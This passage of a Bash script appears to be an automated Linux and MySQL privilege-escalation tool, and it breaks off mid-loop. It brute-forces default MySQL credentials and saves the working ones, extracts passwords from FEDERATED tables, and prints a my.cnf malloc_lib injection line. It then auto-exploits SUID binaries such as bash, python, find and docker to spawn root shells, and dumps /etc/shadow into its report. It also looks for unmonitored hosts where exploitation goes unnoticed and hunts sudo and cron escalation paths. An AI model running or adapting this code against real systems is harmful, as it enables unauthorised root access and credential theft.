        elif [ "$major" -eq 5 ] && [ "$minor" -eq 6 ] 2>/dev/null; then
            log_warning "  MySQL 5.6 - EOL Feb 2021"
            echo "CVE: MySQL 5.6 EOL" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))
        elif [ "$major" -eq 5 ] && [ "$minor" -eq 7 ] 2>/dev/null; then
            if [ -n "$patch" ] && [ "$patch" -lt 31 ] 2>/dev/null; then
                log_warning "  MySQL 5.7.$patch - multiple CVEs pre-5.7.31"
                echo "CVE: MySQL 5.7.$patch outdated" >> "$REPORT_FILE"
                misconfig_count=$((misconfig_count + 1))
            fi
        fi

        # MariaDB specific
        if echo "$version_comment" | grep -qi "mariadb"; then
            if [ "$major" -eq 10 ] && [ "$minor" -le 2 ] 2>/dev/null; then
                log_critical "  MariaDB 10.0-10.2 - EOL! CVE-2016-6662 (config file injection)"
                echo "CVE: MariaDB $version EOL" >> "$REPORT_FILE"
                misconfig_count=$((misconfig_count + 1))
            fi
        fi

        # CVE-2016-6662: MySQL Remote Root Code Execution / Privilege Escalation
        log_info "  Checking CVE-2016-6662 (my.cnf injection)..."
        local my_cnf_paths=("/etc/my.cnf" "/etc/mysql/my.cnf" "/var/lib/mysql/my.cnf")
        for mcnf in "${my_cnf_paths[@]}"; do
            if [ -w "$mcnf" ]; then
                log_critical "  CVE-2016-6662: $mcnf is WRITABLE!"
                log_exploit "  Can inject malloc_lib to load arbitrary .so at MySQL restart"
                echo "CVE-2016-6662: $mcnf writable" >> "$REPORT_FILE"
                misconfig_count=$((misconfig_count + 1))
            fi
        done
    fi

    # --- 20. Default Credentials Bruteforce ---
    log_info "[Misconfig 20/$total_checks] Default credential check..."

    local default_creds=(
        "root:" "root:root" "root:mysql" "root:password" "root:toor"
        "root:admin" "root:123456" "root:12345" "root:1234"
        "admin:admin" "admin:password" "admin:123456"
        "mysql:mysql" "mysql:" "mysql:password"
        "test:test" "test:" "test:password"
        "debian-sys-maint:" "phpmyadmin:"
        "wordpress:wordpress" "drupal:drupal" "joomla:joomla"
    )

    for cred in "${default_creds[@]}"; do
        local def_user=$(echo "$cred" | cut -d: -f1)
        local def_pass=$(echo "$cred" | cut -d: -f2)

        local test_result=""
        if [ -z "$def_pass" ]; then
            test_result=$(mysql -u "$def_user" --connect-timeout=3 -e "SELECT 1" 2>/dev/null)
        else
            test_result=$(mysql -u "$def_user" -p"$def_pass" --connect-timeout=3 -e "SELECT 1" 2>/dev/null)
        fi

        if [ -n "$test_result" ]; then
            log_critical "DEFAULT CREDS WORK: $def_user:${def_pass:-(empty)}"
            echo "DEFAULT_CREDS: $def_user:${def_pass:-(empty)}" >> "$REPORT_FILE"
            echo "$def_user:$def_pass:default_creds" >> "$CREDS_FILE"
            FOUND_PASSWORDS["$def_user"]="$def_pass"
            misconfig_count=$((misconfig_count + 1))

            # Check privileges of this default user
            local def_grants=""
            if [ -z "$def_pass" ]; then
                def_grants=$(mysql -u "$def_user" -N -e "SHOW GRANTS;" 2>/dev/null)
            else
                def_grants=$(mysql -u "$def_user" -p"$def_pass" -N -e "SHOW GRANTS;" 2>/dev/null)
            fi

            if echo "$def_grants" | grep -qiE "ALL PRIVILEGES|FILE|SUPER"; then
                log_exploit "  $def_user has HIGH privileges with default creds!"
            fi
        fi
    done

    # --- 21. FEDERATED Engine ---
    log_info "[Misconfig 21/$total_checks] FEDERATED engine..."

    local federated=$($mysql_cmd -N -e "SELECT SUPPORT FROM information_schema.ENGINES WHERE ENGINE='FEDERATED';" 2>/dev/null)
    if [ "$federated" == "YES" ] || [ "$federated" == "DEFAULT" ]; then
        log_warning "  FEDERATED engine is ENABLED!"
        log_info "  Can create tables that connect to external MySQL servers"
        echo "MISCONFIG: FEDERATED engine enabled" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        # Check for existing federated tables (may contain connection strings with passwords)
        local fed_tables=$($mysql_cmd -N -e "
            SELECT TABLE_SCHEMA, TABLE_NAME, CREATE_OPTIONS
            FROM information_schema.TABLES
            WHERE ENGINE='FEDERATED';" 2>/dev/null)

        if [ -n "$fed_tables" ]; then
            log_critical "  Existing FEDERATED tables found (may contain credentials):"
            echo "$fed_tables" | while IFS=$'\t' read -r fs ft fo; do
                local create_stmt=$($mysql_cmd -N -e "SHOW CREATE TABLE \`${fs}\`.\`${ft}\`;" 2>/dev/null)
                local conn_string=$(echo "$create_stmt" | grep -oP "CONNECTION='[^']+" | cut -d"'" -f2)
                if [ -n "$conn_string" ]; then
                    log_exploit "    $fs.$ft -> $conn_string"
                    echo "FEDERATED_CRED: $conn_string" >> "$REPORT_FILE"

                    local fed_pass=$(echo "$conn_string" | grep -oP '://[^:]+:\K[^@]+')
                    if [ -n "$fed_pass" ]; then
                        echo "federated_user:$fed_pass:federated_table" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["_federated"]="$fed_pass"
                    fi
                fi
            done
        fi
    fi

    # --- 22. Audit Log / Monitoring Disabled ---
    log_info "[Misconfig 22/$total_checks] Audit log & monitoring..."

    local audit_log=$($mysql_cmd -N -e "SELECT @@audit_log_file;" 2>/dev/null)
    local general_log=$($mysql_cmd -N -e "SELECT @@general_log;" 2>/dev/null)

    local monitoring_disabled=0
    if [ -z "$audit_log" ] || [ "$audit_log" == "NULL" ]; then
        log_warning "  Audit log plugin NOT installed"
        monitoring_disabled=1
    fi

    if [ "$general_log" != "ON" ] && [ "$general_log" != "1" ]; then
        log_warning "  General log is OFF"
        monitoring_disabled=$((monitoring_disabled + 1))
    fi

    if [ $monitoring_disabled -ge 2 ]; then
        log_critical "  NO MONITORING! Exploitation will be undetected!"
        echo "MISCONFIG: No audit/monitoring" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # Check if connection control plugin is installed
    local conn_control=$($mysql_cmd -N -e "SELECT PLUGIN_NAME FROM information_schema.PLUGINS WHERE PLUGIN_NAME LIKE '%connection_control%';" 2>/dev/null)
    if [ -z "$conn_control" ]; then
        log_warning "  connection_control plugin NOT installed (no brute-force protection)"
        echo "MISCONFIG: No brute-force protection" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 23. max_connections / Resource Limits ---
    log_info "[Misconfig 23/$total_checks] Resource limits..."

    local max_conn=$($mysql_cmd -N -e "SELECT @@max_connections;" 2>/dev/null)
    local max_user_conn=$($mysql_cmd -N -e "SELECT @@max_user_connections;" 2>/dev/null)

    log_info "  max_connections = $max_conn"
    log_info "  max_user_connections = $max_user_conn"

    if [ -n "$max_user_conn" ] && ([ "$max_user_conn" == "0" ] || [ -z "$max_user_conn" ]); then
        log_warning "  max_user_connections = 0 (unlimited per-user connections)"
        log_info "  DoS via connection exhaustion possible"
        echo "MISCONFIG: Unlimited user connections" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # Check per-user resource limits
    local no_limits=$($mysql_cmd -N -e "
        SELECT User, Host, max_connections, max_user_connections
        FROM mysql.user
        WHERE (max_connections = 0 AND max_user_connections = 0)
        AND User != '' AND User != 'root';" 2>/dev/null)

    if [ -n "$no_limits" ]; then
        local no_limit_count=$(echo "$no_limits" | wc -l)
        log_warning "  $no_limit_count non-root users have NO resource limits"
    fi

    # --- 24. MySQL Configuration File Injection (CVE-2016-6662 Extended) ---
    log_info "[Misconfig 24/$total_checks] Config file injection vectors..."

    # Check if we can write to directories where my.cnf could be loaded from
    local cnf_load_paths=("/etc/" "/etc/mysql/" "/etc/mysql/conf.d/" "/etc/mysql/mysql.conf.d/"
                          "/var/lib/mysql/" "/usr/local/mysql/" "${datadir}" "$(pwd)")

    for cpath in "${cnf_load_paths[@]}"; do
        [ ! -d "$cpath" ] && continue

        if [ -w "$cpath" ]; then
            log_critical "  WRITABLE config directory: $cpath"
            echo "MISCONFIG: Writable config dir $cpath" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))

            # Check if we can create new .cnf files that MySQL will load
            if echo "$cpath" | grep -q "conf.d"; then
                log_exploit "  Can drop .cnf in $cpath -> loaded by !includedir"
                log_info "  Exploit: echo '[mysqld]\nmalloc_lib=/tmp/evil.so' > ${cpath}zzz_evil.cnf"
            fi
        fi
    done

    # Check !includedir directives in my.cnf
    local main_cnf=""
    for mcnf in "/etc/my.cnf" "/etc/mysql/my.cnf"; do
        [ -r "$mcnf" ] && main_cnf="$mcnf" && break
    done

    if [ -n "$main_cnf" ]; then
        local include_dirs=$(grep "^!includedir" "$main_cnf" 2>/dev/null)
        if [ -n "$include_dirs" ]; then
            echo "$include_dirs" | while read inc_line; do
                local inc_dir=$(echo "$inc_line" | awk '{print $2}')
                if [ -w "$inc_dir" ]; then
                    log_critical "  !includedir $inc_dir is WRITABLE!"
                    log_exploit "  Drop malicious .cnf to execute code on MySQL restart"
                fi
            done
        fi
    fi

    # ═══════════════════════════════════════════
    # SUMMARY
    # ═══════════════════════════════════════════
    echo "" | tee -a "$REPORT_FILE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$REPORT_FILE"

    if [ $misconfig_count -gt 0 ]; then
        log_critical "TOTAL MISCONFIGURATIONS: $misconfig_count / $total_checks checks"

        if [ $misconfig_count -ge 10 ]; then
            log_critical "SEVERITY: CRITICAL - System is heavily misconfigured!"
        elif [ $misconfig_count -ge 5 ]; then
            log_warning "SEVERITY: HIGH - Multiple exploitable misconfigurations"
        else
            log_info "SEVERITY: MEDIUM - Some misconfigurations found"
        fi

        echo "TOTAL MISCONFIGURATIONS: $misconfig_count" >> "$REPORT_FILE"
    else
        log_success "No significant misconfigurations detected"
    fi

    echo ""
}

# ═══════════════════════════════════════════════════════════════
# CREDENTIAL REUSE ATTACK
# ═══════════════════════════════════════════════════════════════
# SYSTEM-LEVEL MISCONFIGURATION CHECKS
# SUID/SGID, sudo, crontab, capabilities, Docker, NFS, kernel
# ═══════════════════════════════════════════════════════════════

check_system_misconfigurations() {
    log_exploit "==============================================="
    log_exploit "  SYSTEM MISCONFIGURATION AUDIT"
    log_exploit "  SUID/SGID | Sudo | Cron | Capabilities"
    log_exploit "  Docker | NFS | Kernel | PATH Hijack"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== SYSTEM MISCONFIGURATION AUDIT ===" >> "$REPORT_FILE"

    local sys_misconfig=0

    # --- 1. SUID Binaries ---
    log_info "[SysMisconfig 1/14] Scanning SUID binaries..."

    # Normal SUID: expected on every Linux system, NOT exploitable
    local normal_suid=(
        "su" "sudo" "mount" "umount" "pkexec" "passwd" "chsh" "chfn"
        "newgrp" "gpasswd" "fusermount" "fusermount3" "ping" "ping6"
        "traceroute6" "Xorg" "unix_chkpwd" "at" "crontab"
        "ssh-agent" "dbus-daemon-launch-helper" "polkit-agent-helper-1"
        "snap-confine" "pppd" "mount.nfs" "mount.cifs" "umount.nfs"
        "ntfs-3g" "vmware-user-suid-wrapper"
    )

    # Truly exploitable SUID (GTFOBins confirmed)
    local exploitable_suid=(
        "nmap" "vim" "vim.basic" "vim.tiny" "vi" "find" "bash" "sh" "dash" "zsh" "ksh" "csh"
        "python" "python2" "python3" "python3.11" "python3.12" "python3.13"
        "perl" "perl5" "ruby" "lua" "php" "php7" "php8" "node"
        "env" "awk" "gawk" "mawk" "nawk" "sed" "ed"
        "less" "more" "nano" "pico" "emacs"
        "cp" "mv" "tee" "dd" "install"
        "tar" "zip" "unzip" "rsync" "ar" "cpio"
        "wget" "curl" "nc" "ncat" "netcat" "socat" "ftp" "tftp"
        "docker" "lxc" "kubectl"
        "gcc" "gdb" "strace" "ltrace"
        "screen" "tmux" "script" "expect"
        "git" "make" "man" "nice" "ionice" "taskset" "time" "timeout" "stdbuf"
        "busybox" "capsh" "chroot" "doas"
        "openssl" "ssh-keygen" "ssh" "scp"
        "systemctl" "journalctl" "dmsetup" "logsave"
        "xargs" "xxd" "jq" "sqlite3"
        "rlwrap" "run-parts" "setarch" "unshare" "start-stop-daemon"
    )

    local suid_bins=$(find / -perm -4000 -type f 2>/dev/null | grep -vE "^/proc|^/sys|^/snap")

    if [ -n "$suid_bins" ]; then
        log_success "SUID binaries found:"
        local exploit_targets=()

        echo "$suid_bins" | while read sbin; do
            local sname=$(basename "$sbin")
            local sperms=$(stat -c "%a %U:%G" "$sbin" 2>/dev/null)

            # Skip normal SUID
            local is_normal=0
            for norm in "${normal_suid[@]}"; do
                [ "$sname" == "$norm" ] && { is_normal=1; break; }
            done
            [ $is_normal -eq 1 ] && continue

            # Check if exploitable
            local is_exploitable=0
            for known in "${exploitable_suid[@]}"; do
                if [ "$sname" == "$known" ]; then
                    is_exploitable=1
                    break
                fi
            done

            if [ $is_exploitable -eq 1 ]; then
                log_critical "  EXPLOITABLE SUID: $sbin ($sperms)"
                echo "SUID_EXPLOIT: $sbin ($sperms)" >> "$REPORT_FILE"
                echo "$sbin" >> "/tmp/.suid_targets_$$"
                sys_misconfig=$((sys_misconfig + 1))
            else
                # Non-standard but unknown
                if echo "$sbin" | grep -qvE "^/usr/lib|^/usr/libexec"; then
                    log_warning "  UNUSUAL SUID: $sbin ($sperms)"
                    echo "SUID_UNUSUAL: $sbin ($sperms)" >> "$REPORT_FILE"
                fi
            fi
        done

        # Custom binaries in non-standard paths
        local custom_suid=$(echo "$suid_bins" | grep -vE "^/usr/bin/|^/usr/sbin/|^/usr/lib|^/usr/libexec|^/bin/|^/sbin/|^/snap/")
        if [ -n "$custom_suid" ]; then
            log_critical "NON-STANDARD SUID binaries (high value targets):"
            echo "$custom_suid" | while read cs; do
                log_exploit "  $cs"
                echo "SUID_CUSTOM: $cs" >> "$REPORT_FILE"
                echo "$cs" >> "/tmp/.suid_targets_$$"
                sys_misconfig=$((sys_misconfig + 1))
            done
        fi
    fi

    # ── AUTO-EXPLOIT SUID binaries ──
    if [ -f "/tmp/.suid_targets_$$" ] && [ $SUCCESS -eq 0 ]; then
        log_exploit "Attempting SUID exploitation (GTFOBins)..."
        while read sbin; do
            [ $SUCCESS -eq 1 ] && break
            local sname=$(basename "$sbin")
            case "$sname" in
                bash|sh|dash|zsh|ksh|csh)
                    log_info "  Trying $sbin -p..."
                    local test_id=$("$sbin" -p -c "whoami" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID $sbin -p!"
                        echo "EXPLOIT_SUCCESS: SUID $sbin -p" >> "$REPORT_FILE"
                        SUCCESS=1; ESCALATION_METHOD="SUID $sbin -p"; TARGET_USER="root"
                        "$sbin" -p
                    fi
                    ;;
                find)
                    log_info "  Trying $sbin -exec..."
                    local test_id=$("$sbin" / -maxdepth 0 -exec whoami \; 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID find -exec!"
                        SUCCESS=1; ESCALATION_METHOD="SUID find -exec"; TARGET_USER="root"
                        "$sbin" / -maxdepth 0 -exec /bin/bash -p \;
                    fi
                    ;;
                vim|vim.basic|vim.tiny|vi)
                    log_info "  Trying $sbin shell escape..."
                    local test_id=$("$sbin" -c ':!/bin/sh -c "whoami"' --not-a-term 2>/dev/null | tail -1)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID vim!"
                        SUCCESS=1; ESCALATION_METHOD="SUID vim :!sh"; TARGET_USER="root"
                        "$sbin" -c ':!/bin/bash -p' --not-a-term 2>/dev/null
                    fi
                    ;;
                python|python2|python3|python3.*)
                    log_info "  Trying $sbin os.execl..."
                    local test_id=$("$sbin" -c "import os;os.setuid(0);print(os.popen('whoami').read().strip())" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID python!"
                        SUCCESS=1; ESCALATION_METHOD="SUID python setuid(0)"; TARGET_USER="root"
                        "$sbin" -c "import os;os.setuid(0);os.execl('/bin/bash','bash','-p')"
                    fi
                    ;;
                perl|perl5)
                    log_info "  Trying $sbin exec..."
                    local test_id=$("$sbin" -e 'print `whoami`' 2>/dev/null | tr -d '\n')
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID perl!"
                        SUCCESS=1; ESCALATION_METHOD="SUID perl exec"; TARGET_USER="root"
                        "$sbin" -e 'exec "/bin/bash -p"'
                    fi
                    ;;
                ruby)
                    log_info "  Trying $sbin exec..."
                    local test_id=$("$sbin" -e 'puts `whoami`.strip' 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID ruby!"
                        SUCCESS=1; ESCALATION_METHOD="SUID ruby exec"; TARGET_USER="root"
                        "$sbin" -e 'exec "/bin/bash -p"'
                    fi
                    ;;
                lua)
                    log_info "  Trying $sbin os.execute..."
                    local test_id=$("$sbin" -e 'os.execute("whoami")' 2>/dev/null | head -1)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID lua!"
                        SUCCESS=1; ESCALATION_METHOD="SUID lua os.execute"; TARGET_USER="root"
                        "$sbin" -e 'os.execute("/bin/bash -p")'
                    fi
                    ;;
                php|php7*|php8*)
                    log_info "  Trying $sbin exec..."
                    local test_id=$("$sbin" -r 'echo exec("whoami");' 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID php!"
                        SUCCESS=1; ESCALATION_METHOD="SUID php exec"; TARGET_USER="root"
                        "$sbin" -r 'posix_setuid(0);pcntl_exec("/bin/bash",["-p"]);'
                    fi
                    ;;
                node)
                    log_info "  Trying $sbin child_process..."
                    local test_id=$("$sbin" -e "process.setuid(0);console.log(require('child_process').execSync('whoami').toString().trim())" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID node!"
                        SUCCESS=1; ESCALATION_METHOD="SUID node setuid(0)"; TARGET_USER="root"
                        "$sbin" -e "process.setuid(0);require('child_process').spawn('/bin/bash',['-p'],{stdio:'inherit'})"
                    fi
                    ;;
                env)
                    log_info "  Trying $sbin /bin/bash -p..."
                    local test_id=$("$sbin" /bin/bash -p -c "whoami" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID env!"
                        SUCCESS=1; ESCALATION_METHOD="SUID env /bin/bash"; TARGET_USER="root"
                        "$sbin" /bin/bash -p
                    fi
                    ;;
                awk|gawk|mawk|nawk)
                    log_info "  Trying $sbin system()..."
                    local test_id=$("$sbin" 'BEGIN{cmd="whoami";cmd|getline r;print r}' 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID awk!"
                        SUCCESS=1; ESCALATION_METHOD="SUID awk system()"; TARGET_USER="root"
                        "$sbin" 'BEGIN{system("/bin/bash -p")}'
                    fi
                    ;;
                less|more)
                    log_info "  Trying $sbin shell escape..."
                    local test_id=$(echo '!/bin/sh -c whoami' | "$sbin" /etc/hostname 2>/dev/null | tail -1)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID $sname!"
                        SUCCESS=1; ESCALATION_METHOD="SUID $sname !sh"; TARGET_USER="root"
                    fi
                    ;;
                nmap)
                    log_info "  Trying $sbin interactive..."
                    if "$sbin" --version 2>&1 | grep -q "2\.\|3\.\|4\.\|5\."; then
                        local test_id=$(echo -e '!whoami\nquit' | "$sbin" --interactive 2>/dev/null | grep -v "nmap>")
                        if [ "$test_id" == "root" ]; then
                            log_exploit "ROOT via SUID nmap --interactive!"
                            SUCCESS=1; ESCALATION_METHOD="SUID nmap --interactive"; TARGET_USER="root"
                            "$sbin" --interactive
                        fi
                    else
                        log_info "  Trying nmap --script..."
                        echo 'os.execute("/bin/bash -p")' > /tmp/.nse_shell
                        local test_id=$("$sbin" --script=/tmp/.nse_shell 2>/dev/null | head -1)
                        rm -f /tmp/.nse_shell
                    fi
                    ;;
                tar)
                    log_info "  Trying $sbin checkpoint..."
                    local test_id=$("$sbin" cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="whoami" 2>/dev/null)
                    if echo "$test_id" | grep -q "root"; then
                        log_exploit "ROOT via SUID tar checkpoint!"
                        SUCCESS=1; ESCALATION_METHOD="SUID tar --checkpoint-action"; TARGET_USER="root"
                        "$sbin" cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/bash -p"
                    fi
                    ;;
                cp)
                    log_info "  Trying $sbin /etc/passwd overwrite..."
                    local new_root='root2:$(openssl passwd -1 pwned):0:0:root:/root:/bin/bash'
                    if "$sbin" /etc/passwd /tmp/.passwd_bak 2>/dev/null; then
                        log_warning "  cp SUID can overwrite /etc/passwd (manual exploit needed)"
                        echo "SUID_CP: can overwrite /etc/passwd" >> "$REPORT_FILE"
                    fi
                    ;;
                tee)
                    log_info "  Trying $sbin /etc/passwd append..."
                    log_warning "  tee SUID can write to /etc/passwd (manual exploit possible)"
                    echo "SUID_TEE: can write to any file" >> "$REPORT_FILE"
                    ;;
                docker)
                    log_info "  Trying $sbin root mount..."
                    local test_id=$("$sbin" run -v /:/mnt --rm alpine chroot /mnt whoami 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID docker!"
                        SUCCESS=1; ESCALATION_METHOD="SUID docker chroot"; TARGET_USER="root"
                        "$sbin" run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
                    fi
                    ;;
                gdb)
                    log_info "  Trying $sbin..."
                    local test_id=$("$sbin" -nx -ex 'python import os; os.setuid(0); print(os.popen("whoami").read().strip())' -ex quit 2>/dev/null | tail -1)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID gdb!"
                        SUCCESS=1; ESCALATION_METHOD="SUID gdb python"; TARGET_USER="root"
                        "$sbin" -nx -ex 'python import os; os.setuid(0); os.execl("/bin/bash","bash","-p")' -ex quit
                    fi
                    ;;
                strace)
                    log_info "  Trying $sbin -o..."
                    local test_id=$("$sbin" -o /dev/null /bin/bash -p -c "whoami" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID strace!"
                        SUCCESS=1; ESCALATION_METHOD="SUID strace"; TARGET_USER="root"
                        "$sbin" -o /dev/null /bin/bash -p
                    fi
                    ;;
                screen)
                    log_info "  Trying $sbin (CVE-2017-5618)..."
                    if "$sbin" --version 2>&1 | grep -q "4\.05"; then
                        log_exploit "Screen 4.05 SUID - CVE-2017-5618!"
                        echo "SUID_SCREEN: CVE-2017-5618 exploitable" >> "$REPORT_FILE"
                    fi
                    ;;
                busybox)
                    log_info "  Trying $sbin ash..."
                    local test_id=$("$sbin" ash -c "whoami" 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID busybox!"
                        SUCCESS=1; ESCALATION_METHOD="SUID busybox ash"; TARGET_USER="root"
                        "$sbin" ash
                    fi
                    ;;
                openssl)
                    log_info "  Trying $sbin file read..."
                    local shadow=$("$sbin" enc -in /etc/shadow 2>/dev/null | head -3)
                    if [ -n "$shadow" ]; then
                        log_critical "SUID openssl can read /etc/shadow!"
                        echo "$shadow" >> "$REPORT_FILE"
                        echo "SUID_OPENSSL: /etc/shadow readable" >> "$REPORT_FILE"
                    fi
                    ;;
                wget)
                    log_info "  Trying $sbin file overwrite..."
                    log_warning "  SUID wget can overwrite arbitrary files (manual exploit)"
                    echo "SUID_WGET: arbitrary file overwrite" >> "$REPORT_FILE"
                    ;;
                curl)
                    log_info "  Trying $sbin file read..."
                    local shadow=$("$sbin" file:///etc/shadow 2>/dev/null | head -3)
                    if [ -n "$shadow" ]; then
                        log_critical "SUID curl can read /etc/shadow!"
                        echo "$shadow" >> "$REPORT_FILE"
                        echo "SUID_CURL: /etc/shadow readable" >> "$REPORT_FILE"
                    fi
                    ;;
                git)
                    log_info "  Trying $sbin pager escape..."
                    local test_id=$(PAGER='sh -c "whoami"' "$sbin" -p help 2>/dev/null | head -1)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID git!"
                        SUCCESS=1; ESCALATION_METHOD="SUID git PAGER"; TARGET_USER="root"
                        PAGER='/bin/bash -p' "$sbin" -p help
                    fi
                    ;;
                sed)
                    log_info "  Trying $sbin exec..."
                    local test_id=$("$sbin" -n '1e whoami' /etc/hostname 2>/dev/null)
                    if [ "$test_id" == "root" ]; then
                        log_exploit "ROOT via SUID sed!"
                        SUCCESS=1; ESCALATION_METHOD="SUID sed exec"; TARGET_USER="root"
                        "$sbin" -n '1e exec /bin/bash -p' /etc/hostname
                    fi
                    ;;
                nano|pico)
                    log_info "  $sname SUID: can edit any file (manual /etc/passwd edit)"
                    echo "SUID_NANO: can edit /etc/passwd /etc/shadow" >> "$REPORT_FILE"
                    ;;
                ssh|scp)
                    log_info "  $sname SUID: can proxy commands as root"
                    echo "SUID_SSH: escalation via ProxyCommand" >> "$REPORT_FILE"
                    ;;
                systemctl)
                    log_info "  Trying $sbin service exploit..."
                    log_warning "  SUID systemctl: create malicious .service for root exec"
                    echo "SUID_SYSTEMCTL: arbitrary service creation" >> "$REPORT_FILE"
                    ;;
                *)
                    log_info "  Trying generic exec on $sbin..."
                    local test_id=$("$sbin" --help 2>&1 | head -1)
                    log_warning "  Unknown SUID: $sbin (manual review needed)"
                    echo "SUID_UNKNOWN: $sbin" >> "$REPORT_FILE"
                    ;;
            esac
        done < "/tmp/.suid_targets_$$"
        rm -f "/tmp/.suid_targets_$$"
    fi

    # --- 2. SGID Binaries ---
    log_info "[SysMisconfig 2/14] Scanning SGID binaries..."

    local sgid_bins=$(find / -perm -2000 -type f 2>/dev/null | head -30)
    if [ -n "$sgid_bins" ]; then
        local sgid_custom=$(echo "$sgid_bins" | grep -vE "^/usr/|^/bin/|^/sbin/|^/snap/")
        if [ -n "$sgid_custom" ]; then
            log_warning "Non-standard SGID binaries:"
            echo "$sgid_custom" | while read sg; do
                log_info "  SGID: $sg"
                echo "SGID_CUSTOM: $sg" >> "$REPORT_FILE"
            done
            sys_misconfig=$((sys_misconfig + 1))
        fi
    fi

    # --- 3. Sudo Misconfiguration ---
    log_info "[SysMisconfig 3/14] Checking sudo configuration..."

    local sudo_l=$(sudo -l 2>/dev/null)

    if [ -n "$sudo_l" ]; then
        log_success "sudo -l output:"
        echo "$sudo_l" | while read sl; do log_info "  $sl"; done
        echo "SUDO: $sudo_l" >> "$REPORT_FILE"

        # Check NOPASSWD
        if echo "$sudo_l" | grep -q "NOPASSWD"; then
            log_critical "NOPASSWD sudo entries found!"

            local nopasswd_cmds=$(echo "$sudo_l" | grep "NOPASSWD" | sed 's/.*NOPASSWD: //')
            echo "$nopasswd_cmds" | tr ',' '\n' | while read ncmd; do
                ncmd=$(echo "$ncmd" | xargs)
                log_exploit "  NOPASSWD: $ncmd"

                if echo "$ncmd" | grep -qE "ALL|/bin/bash|/bin/sh|/usr/bin/env|/usr/bin/python|/usr/bin/perl|/usr/bin/ruby|/usr/bin/vim|/usr/bin/find|/usr/bin/awk|/usr/bin/less|/usr/bin/more|/usr/bin/man|/usr/bin/nmap|/usr/bin/ftp|/usr/bin/docker|/usr/bin/lxc"; then
                    log_critical "  DIRECT ROOT ESCALATION possible via: $ncmd"
                    echo "SUDO_ESCALATION: $ncmd" >> "$REPORT_FILE"
                    sys_misconfig=$((sys_misconfig + 1))
                fi
            done
        fi

        # Check (ALL : ALL) ALL
        if echo "$sudo_l" | grep -qE "\(ALL\s*:\s*ALL\)\s*ALL|\(root\)\s*ALL"; then
            log_critical "Full sudo access! Just need password."
            sys_misconfig=$((sys_misconfig + 1))
        fi

        # Check env_keep (LD_PRELOAD, LD_LIBRARY_PATH)
        if echo "$sudo_l" | grep -qiE "LD_PRELOAD|LD_LIBRARY_PATH"; then
            log_critical "LD_PRELOAD/LD_LIBRARY_PATH kept in sudo! Shared library injection possible!"
            echo "SUDO_LDPRELOAD: env_keep found" >> "$REPORT_FILE"
            sys_misconfig=$((sys_misconfig + 1))
        fi
    fi

    # Check sudoers file readable
    if [ -r /etc/sudoers ]; then
        log_critical "/etc/sudoers is READABLE!"
        local sudoers_content=$(cat /etc/sudoers 2>/dev/null | grep -vE "^#|^$|^Defaults")
        echo "$sudoers_content" | while read scl; do
            log_info "  $scl"
        done
        echo "SUDOERS: readable" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # Check sudoers.d writable
    if [ -d /etc/sudoers.d ] && [ -w /etc/sudoers.d ]; then
        log_critical "/etc/sudoers.d is WRITABLE! Can add sudo rules!"
        echo "SUDO_MISCONFIG: /etc/sudoers.d writable" >> "$REPORT_FILE"
        sys_misconfig=$((sys_misconfig + 1))
    fi

    # --- 4. Crontab Misconfiguration ---
    log_info "[SysMisconfig 4/14] Checking crontab & scheduled tasks..."

    # System crontabs
    local cron_files=("/etc/crontab" "/etc/cron.d/" "/var/spool/cron/" "/var/spool/cron/crontabs/")

    for cf in "${cron_files[@]}"; do
        if [ -r "$cf" ] && [ -f "$cf" ]; then
            log_success "  Readable crontab: $cf"
            local cron_content=$(cat "$cf" 2>/dev/null | grep -vE "^#|^$")
            echo "$cron_content" | while read ccl; do
                log_info "    $ccl"

                # Check if cron runs writable scripts
                local cron_cmd=$(echo "$ccl" | awk '{for(i=6;i<=NF;i++) printf $i" "; print ""}' | xargs)
                local first_cmd=$(echo "$cron_cmd" | awk '{print $1}')

                if [ -n "$first_cmd" ] && [ -f "$first_cmd" ] && [ -w "$first_cmd" ]; then
                    log_critical "    WRITABLE script in cron: $first_cmd"
                    local cron_user=$(echo "$ccl" | awk '{print $6}')
                    log_exploit "    Runs as: ${cron_user:-unknown} - inject for code exec!"
                    echo "CRON_WRITABLE: $first_cmd (user: ${cron_user:-unknown})" >> "$REPORT_FILE"
                    sys_misconfig=$((sys_misconfig + 1))
                fi
            done
        fi

        if [ -d "$cf" ]; then
            find "$cf" -readable -type f 2>/dev/null | while read dcf; do
                log_info "  Readable: $dcf"
